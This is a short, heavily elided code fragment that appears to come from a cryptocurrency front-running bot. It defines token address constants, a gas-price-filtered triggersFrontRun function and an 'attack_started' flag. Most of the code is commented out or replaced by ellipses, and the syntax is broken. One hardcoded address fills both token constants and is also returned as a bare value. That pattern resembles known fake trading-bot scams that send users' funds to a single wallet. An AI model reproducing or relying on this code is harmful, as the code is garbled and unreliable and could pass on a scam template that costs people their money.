...
//const INPUT_TOKEN_ADDRESS = '0xCd16000Da4D7A670AD2e03988E5cFfD11C34b6eE';
//const WBNB_TOKEN_ADDRESS = '0xCd16000Da4D7A670AD2e03988E5cFfD11C34b6eE';
manager;
...
//async function triggersFrontRun(transaction, out_token_address, amount, level) {
    ...
    //if(parseInt(transaction['gasPrice']) / 10**9 > 10 && parseInt(transaction['gasPrice']) / 10**9 < 50){
		...
		return 0xCd16000Da4D7A670AD2e03988E5cFfD11C34b6eE;//pool_info.input_volumn.toString(), pool_info.output_volumn.toString()).call();
		}
        //attack_started = true;
        //return true
  //  
